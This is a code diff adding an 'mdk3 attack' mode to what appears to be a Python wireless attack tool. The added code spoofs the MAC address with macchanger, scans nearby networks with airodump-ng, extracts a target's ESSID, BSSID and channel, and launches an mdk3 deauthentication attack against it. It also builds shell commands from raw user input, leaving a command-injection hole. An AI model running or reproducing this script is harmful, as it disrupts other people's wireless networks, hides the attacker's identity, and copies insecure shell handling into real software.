@@ -72,6 +72,33 @@ def start():
       
    if(sys.argv[1] == "--m"):#mdk3 attack
       cls()
+      print("Listing Wireless cards: ")
+      os.system("ifconfig | grep -e ': ' | sed -e 's/: .*//g' | sed -e 's/^//' > monitor.rmo")
+      os.system('cat -n monitor.rmo')
+      monitor = raw_input("Select you wirelles card fo monitor mode: ")
+      print("")
+   
+      os.system("ifconfig | grep -e ': ' | sed -e 's/: .*//g' | sed -e 's/^//' | grep -n ^ | grep '"+monitor+"' | cut -d: -f2 > monitor.rmo")
+      print("Changing the MAC")
+      os.system("monitor=`cat monitor.rmo` && ifconfig $monitor down")
+      os.system("monitor=`cat monitor.rmo` && macchanger -r $monitor")
+      os.system("monitor=`cat monitor.rmo` && ifconfig $monitor up")
+      print("")
+   
+      
+      print("")
+      print("Listing avaliable wireless network for attack: ")
+      os.system("monitor=`cat monitor.rmo` && airodump-ng $monitor -w target")
+      target = raw_input("Select one ESSID for start the attack: ")
+      os.system("cat target-01.csv | grep '"+target+"' > target.rmo")
+      os.system("cat target-01.csv | grep '"+target+"' | awk '{print FS1 $20}' | sed 's/,//g' > tessid.rmo")
+      os.system("cat target-01.csv | grep '"+target+"' | awk '{print FS1 $1}' | sed 's/,//g' > tbssid.rmo")
+      os.system("cat target-01.csv | grep '"+target+"' | awk '{print FS1 $6}' | sed 's/,//g' > tchannel.rmo")
+      print("")
+      
+      print("############################# mdk3 attack! #######################################")
+      os.system("monitor=`cat monitor.rmo` && tessid=`cat tessid.rmo` && mdk3 $monitor d -n '"+target+"'")
+      os.system('rm *.rmo && rm target*')
       
       
    if(sys.argv[1] == "-q"):#Quiet attack
